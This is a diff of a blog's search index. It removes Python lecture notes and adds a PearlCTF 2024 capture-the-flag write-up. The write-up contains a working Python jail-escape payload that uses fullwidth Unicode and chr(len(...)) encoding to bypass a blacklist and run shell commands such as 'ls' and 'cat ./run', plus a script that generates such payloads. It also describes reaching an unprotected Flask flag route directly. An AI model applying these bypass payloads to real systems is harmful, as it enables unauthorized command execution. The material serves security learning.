@@ -39,100 +39,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2023.3.7 第二次课</title>
-    <url>/2024/03/07/20240307/</url>
-    <content><![CDATA[<h1 id="执行-py-文件"><a href="#执行-py-文件" class="headerlink" title="执行 .py 文件"></a>执行 <code>.py</code> 文件</h1><p>在命令行中输入 <code>Python filename</code> 执行程序，<code>filename</code> 为待执行的代码。</p>
-<h2 id="相对路径与绝对路径"><a href="#相对路径与绝对路径" class="headerlink" title="相对路径与绝对路径"></a>相对路径与绝对路径</h2><p>cmd 的路径为 <code>C:\Windows\system32</code>，当且仅当待执行代码在当前文件夹下，可以使用相对路径，否则必须使用绝对路径。</p>
-<p>举一个例子，假设待执行代码为 program.py，位置在 <code>C:\Windows\system32\</code>，则可以直接输入 <code>python program.py</code> 执行代码；若位置在 <code>E:\program\</code> 下，则需要输入 <code>python E:\program\program.py</code> 执行代码。</p>
-<h1 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h1><p>在 Python 中，四则运算的优先级与数学中四则运算优先级相同，先算括号，其次是乘方，再次是乘除，最后是加减。</p>
-<h2 id="除与整除"><a href="#除与整除" class="headerlink" title="除与整除"></a>除与整除</h2><p><code>/</code> 为除，得到浮点型数据；<code>//</code> 为整除，得到整型数据。举例：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">7</span> / <span class="number">4</span></span><br><span class="line"><span class="number">1.75</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">7</span> // <span class="number">4</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="乘方"><a href="#乘方" class="headerlink" title="乘方"></a>乘方</h2><p>Python 中使用 <code>**</code> 代表乘方：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">5</span> ** <span class="number">2</span></span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure>
-
-<p>同时，<code>**</code> 也可以用于计算开根：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">5</span> ** <span class="number">0.5</span></span><br><span class="line"><span class="number">2.23606797749979</span></span><br></pre></td></tr></table></figure>
-
-<p>当然，我们还可以用 Python 自带的 <code>math</code> 模块的 <code>sqrt()</code> 方法计算二次方根。导入模块的方法为 <code>import module</code>，<code>module</code> 为待导入的模块，<code>help(module)</code> 可以查看某个模块中可用的类、方法、常量。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.<span class="built_in">pow</span>(<span class="number">5</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">25.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>math.sqrt(<span class="number">5</span>)</span><br><span class="line"><span class="number">2.23606797749979</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="主函数传递参数"><a href="#主函数传递参数" class="headerlink" title="主函数传递参数"></a>主函数传递参数</h1><p>之前研究过 C&#x2F;C++ 中的 <code>main()</code> 函数参数传递，直接粘过来：</p>
-<p>What is <code>int main(int argc, char **argv, char **enpv)</code> ?</p>
-<h2 id="argc"><a href="#argc" class="headerlink" title="argc"></a>argc</h2><p><code>argc</code> 为整型数据，存储命令行参数的个数。</p>
-<h2 id="argv"><a href="#argv" class="headerlink" title="argv"></a>argv</h2><p><code>argv</code> 为“指向指针的指针”，即字符串数组，用于存储命令行参数。该参数亦可写作 <code>*argv[]</code>。argc的值即为<code>argv</code>元素的数量。<code>argv[0]</code> 存储的是当前程序的位置。</p>
-<h2 id="envp"><a href="#envp" class="headerlink" title="envp"></a>envp</h2><p><code>envp</code> 的类型也是“指向指针的指针”，存放当前程序运行环境的参数.</p>
-<p>我们不妨运行下面的代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; argc &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; argv[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; envp[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>随后我们能得到下面的结果</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">E:\Documents\Test Programs\Test\Debug\Test.exe</span><br><span class="line">ADSK_3DSMAX_x64</span><br></pre></td></tr></table></figure>
-
-<p>前面提到，<code>argv</code> 用于存储命令行参数，如果我们在运行程序时添加一些参数，就能改变argc与argv的值。</p>
-<p>我们不妨修改一下代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; argc &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; argv[i] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>随后在同一文件夹下创建 Test.txt，在命令行中运行命令 <code>start Test.exe Test.txt</code>，可以看到程序的输出如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">Test.exe</span><br><span class="line">Test.txt</span><br></pre></td></tr></table></figure>
-
-<p>在 Python 中，向程序传递的参数存储在 <code>sys.argv</code> 中，需要提前导入 <code>sys</code> 模块；在 Java 中是 <code>String[] args</code></p>
-<h1 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h1><p>Python 支持二进制、八进制、十进制、十六进制。如无特殊说明，则默认使用十进制。</p>
-<table>
-<thead>
-<tr>
-<th align="center">名称</th>
-<th align="center">标识</th>
-<th align="center">转换方法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">二进制</td>
-<td align="center"><code>0b</code></td>
-<td align="center"><code>bin()</code></td>
-</tr>
-<tr>
-<td align="center">八进制</td>
-<td align="center"><code>0o</code></td>
-<td align="center"><code>oct()</code></td>
-</tr>
-<tr>
-<td align="center">十进制</td>
-<td align="center">无</td>
-<td align="center"><code>int()</code></td>
-</tr>
-<tr>
-<td align="center">十六进制</td>
-<td align="center"><code>0x</code></td>
-<td align="center"><code>hex()</code></td>
-</tr>
-</tbody></table>
-<p>举例：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="number">0b1101</span>)  <span class="comment"># 将二进制 1101 转化为十进制</span></span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0o1453</span>)  <span class="comment"># 将八进制 1453 转化为十六进制</span></span><br><span class="line"><span class="string">&#x27;0x32b&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="小整数池"><a href="#小整数池" class="headerlink" title="小整数池"></a>小整数池</h1><p>见文章 <a href="https://jackgdn.github.io/2024/03/07/Python-%E5%86%85%E5%AD%98%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#%E5%B0%8F%E6%95%B4%E6%95%B0%E6%B1%A0">Python 内存相关学习记录 - 小整数池</a></p>
-<h1 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h1><p>操作符分为单目操作符、双目操作符与三目操作符，即用于标识操作符前后的操作数个数。例如：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">not</span> <span class="literal">True</span>  <span class="comment"># not 是弹幕操作符</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span> + <span class="number">2</span>  <span class="comment"># + 是双目操作符</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="除余操作（模运算）"><a href="#除余操作（模运算）" class="headerlink" title="除余操作（模运算）"></a>除余操作（模运算）</h2><p><code>%</code> 是一个双目操作数，用于取余数。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">10</span> % <span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p><em>在 Python 中，浮点类型数据也可以做模运算，不过意义不大。</em></p>
-<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>逻辑运算符又三个 <code>and</code> <code>or</code> <code>not</code>，运算结果为布尔型。<code>and</code> <code>or</code> 的优先级低于数学运算符。</p>
-<h1 id="Python-变量命名规则"><a href="#Python-变量命名规则" class="headerlink" title="Python 变量命名规则"></a>Python 变量命名规则</h1><ul>
-<li>可以使用字母或下划线开头，不能使用数字开头</li>
-<li>仅数字、字母与下划线可以出现在变量名中</li>
-<li>Python 关键字不可用于变量名</li>
-</ul>
-<p><strong>注意：虽然一些有特殊含义与用途的单词允许被用作变量名（例如 <code>str</code> <code>int</code>），但这样做会引发歧义，因此不建议这样命名变量！</strong></p>
-]]></content>
-      <categories>
-        <category>Python 编程导论笔记</category>
-      </categories>
-      <tags>
-        <tag>Python 编程导论笔记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NSSCTF Round#18 WP</title>
     <url>/2024/03/06/NSS18/</url>
     <content><![CDATA[<h1 id="users-users-revenge"><a href="#users-users-revenge" class="headerlink" title="users &amp; users_revenge"></a>users &amp; users_revenge</h1><p>两道题可以用同一个脚本解。两道题区别就是题目 1 给出 200 个用户名，题目 2 给出 500 个用户名，密码为用户名的 MD5，其中有一个用户里有 flag，考虑使用 pwntools 连接。</p>
@@ -190,6 +96,49 @@
         <tag>Reverse</tag>
         <tag>Pwn</tag>
         <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PearlCTF 2024 WP</title>
+    <url>/2024/03/10/Pearl2024/</url>
+    <content><![CDATA[<p>I am so vegetable 我太菜了 :-(</p>
+<h1 id="b4by-jail"><a href="#b4by-jail" class="headerlink" title="b4by_jail"></a>b4by_jail</h1><p>一道简单的 Python 沙箱逃逸（指连我都会做），题目附件如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="string">&quot;pearl&#123;f4k3_fl4g&#125;&quot;</span></span><br><span class="line">blacklist=<span class="built_in">list</span>(<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~`![]&#123;&#125;,&lt;&gt;/123456789&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    file=<span class="built_in">open</span>(<span class="string">&quot;txt.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    <span class="built_in">print</span>(file)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_blocklist</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    banner()</span><br><span class="line">    cmd=<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(check_blocklist(cmd)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">eval</span>(cmd))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Sorry no valid output to show.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Your sentence has been increased by 2 years for attempted escape.&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>所有的字母都被屏蔽，部分符号被屏蔽，数字仅 0 可用，因此想到使用 Unicode 特殊字符绕过。把 <code>__import__(&#39;os&#39;).system(&#39;ls&#39;)</code> 的全部字母都换成全角字符：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__ｉｍｐｏｒｔ__(<span class="string">&#x27;ｏｓ&#x27;</span>).ｓｙｓｔｅｍ(<span class="string">&#x27;ｌｓ&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ModuleNotFoundError: No module named <span class="string">&#x27;ｏｓ&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据 web 师傅的经验，在进行 SSTI 注入时，模块名只能使用原字符。同时由于 Linux 操作系统的限制，<code>os.system()</code> 中的指令也只能使用原字符。因此我们使用下面的方法作为修改过的载荷：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__ｉｍｐｏｒｔ__(ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>))).ｓｙｓｔｅｍ(ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>其中的 “os” 与 “ls” 都使用 0 的数量表示，最终拼凑出来的是原字符。通过这个载荷可以看到 flag 所在的文件：<code>./run</code>。随后将载荷中的 “ls” 改为 “cat .&#x2F;run” 得到 flag。修改后的载荷如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__ｉｍｐｏｒｔ__(ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>))).ｓｙｓｔｅｍ(ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;0000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)) + ｃｈｒ(ｌｅｎ(<span class="string">&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>修改载荷的脚本（用于将字符使用 0 的数量表示）：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = <span class="string">&quot;cat ./run&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    s += <span class="string">&quot;ｃｈｒ(ｌｅｎ(&#x27;&quot;</span></span><br><span class="line">    s += <span class="built_in">ord</span>(i) * <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    s += <span class="string">&quot;&#x27;)) + &quot;</span></span><br><span class="line"><span class="built_in">print</span>(s[:-<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># output: ｃｈｒ(ｌｅｎ(&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;00000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;0000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;00000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;)) + ｃｈｒ(ｌｅｎ(&#x27;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;))</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="TooRandom"><a href="#TooRandom" class="headerlink" title="TooRandom"></a>TooRandom</h1><p>能解出这道题就是 too random。下面是题目源码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&quot;secret_key&quot;</span></span><br><span class="line"></span><br><span class="line">seed = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">random.seed(seed)</span><br><span class="line">flag_no = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_user_ids</span>():</span><br><span class="line">    <span class="keyword">global</span> flag_no</span><br><span class="line">    random_numbers = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        random_number = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">        random_numbers.append(random_number)</span><br><span class="line">    flag_no = random_numbers[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag_no)</span><br><span class="line">    st_id = <span class="number">624</span></span><br><span class="line">    end_id = <span class="number">999999</span></span><br><span class="line">    <span class="keyword">del</span> random_numbers[st_id:end_id]</span><br><span class="line">    <span class="keyword">return</span> random_numbers</span><br><span class="line"></span><br><span class="line">user_ids = generate_user_ids()</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/dashboard&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">global</span> j</span><br><span class="line">    id_no = user_ids[j%<span class="number">624</span>]</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        number = <span class="built_in">int</span>(request.form[<span class="string">&#x27;number&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> number == flag_no:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/flagkeeper&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/wrongnumber&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, number=id_no)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flagkeeper&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flagkeeper_dashboard</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;flag_keeper.html&#x27;</span>, user_id=flag_no)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/wrongnumber&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wrong_number</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;wrong_number.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>题目需要开启实例，进去后会让用户输入一个随机数：</p>
+<p>![](“D:\ProgramData\Github Pages\node_modules\hexo-theme-async\source\img\Pearl2024\image.png”)</p>
+<p>此页面为 <code>/dashboard</code>。如果随便输入一个数，大概率会错误，然后进入一个错误页面：</p>
+<p>![](“D:\ProgramData\Github Pages\node_modules\hexo-theme-async\source\img\Pearl2024\image-1.png”)</p>
+<p>此时页面为 <code>/wrongnumber</code>。根据题目给出代码中的逻辑，如果输入数字错误，则会进入 <code>/wrongnumber</code>，否则进入 <code>/flagkeeper</code>，因此尝试直接进入 <code>/flagkeeper</code>：</p>
+<p>![](“D:\ProgramData\Github Pages\node_modules\hexo-theme-async\source\img\Pearl2024\image-2.png”)</p>
+<p>噫！我中了！网页竟然连个保护都没有，应该是非预期解了。</p>
+<h1 id="input-validator"><a href="#input-validator" class="headerlink" title="input_validator"></a>input_validator</h1><p>题目附件是一个 Java 类，反编译得到：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Source code is decompiled from a .class file using FernFlower decompiler.</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">input_validator</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">FLAG_LEN</span> <span class="operator">=</span> <span class="number">34</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">input_validator</span><span class="params">()</span> &#123;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">validate</span><span class="params">(String var0, String var1)</span> &#123;</span><br><span class="line">      <span class="type">int</span>[] var2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">34</span>];</span><br><span class="line">      <span class="type">int</span>[] var3 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1102</span>, <span class="number">1067</span>, <span class="number">1032</span>, <span class="number">1562</span>, <span class="number">1612</span>, <span class="number">1257</span>, <span class="number">1562</span>, <span class="number">1067</span>, <span class="number">1012</span>, <span class="number">902</span>, <span class="number">882</span>, <span class="number">1397</span>, <span class="number">1472</span>, <span class="number">1312</span>, <span class="number">1442</span>, <span class="number">1582</span>, <span class="number">1067</span>, <span class="number">1263</span>, <span class="number">1363</span>, <span class="number">1413</span>, <span class="number">1379</span>, <span class="number">1311</span>, <span class="number">1187</span>, <span class="number">1285</span>, <span class="number">1217</span>, <span class="number">1313</span>, <span class="number">1297</span>, <span class="number">1431</span>, <span class="number">1137</span>, <span class="number">1273</span>, <span class="number">1161</span>, <span class="number">1339</span>, <span class="number">1267</span>, <span class="number">1427</span>&#125;;</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> var4;</span><br><span class="line">      <span class="keyword">for</span>(var4 = <span class="number">0</span>; var4 &lt; <span class="number">34</span>; ++var4) &#123;</span><br><span class="line">         var2[var4] = var0.charAt(var4) ^ var1.charAt(var4);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(var4 = <span class="number">0</span>; var4 &lt; <span class="number">34</span>; ++var4) &#123;</span><br><span class="line">         var2[var4] -= var1.charAt(<span class="number">33</span> - var4);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span>[] var6 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">34</span>];</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> var5;</span><br><span class="line">      <span class="keyword">for</span>(var5 = <span class="number">0</span>; var5 &lt; <span class="number">17</span>; ++var5) &#123;</span><br><span class="line">         var6[var5] = var2[<span class="number">1</span> + var5 * <span class="number">2</span>] * <span class="number">5</span>;</span><br><span class="line">         var6[var5 + <span class="number">17</span>] = var2[var5 * <span class="number">2</span>] * <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(var5 = <span class="number">0</span>; var5 &lt; <span class="number">34</span>; ++var5) &#123;</span><br><span class="line">         var6[var5] += <span class="number">1337</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(var5 = <span class="number">0</span>; var5 &lt; <span class="number">34</span>; ++var5) &#123;</span><br><span class="line">         <span class="keyword">if</span> (var6[var5] != var3[var5]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] var0)</span> &#123;</span><br><span class="line">      <span class="type">Scanner</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">      <span class="type">String</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="string">&quot;oF/M5BK_U&lt;rqxCf8zWCPC(RK,/B&#x27;v3uARD&quot;</span>;</span><br><span class="line">      System.out.print(<span class="string">&quot;Enter input: &quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">var3</span> <span class="operator">=</span> var1.nextLine();</span><br><span class="line">      <span class="keyword">if</span> (var3.length() != <span class="number">34</span>) &#123;</span><br><span class="line">         System.out.println(<span class="string">&quot;Input length does not match!&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> 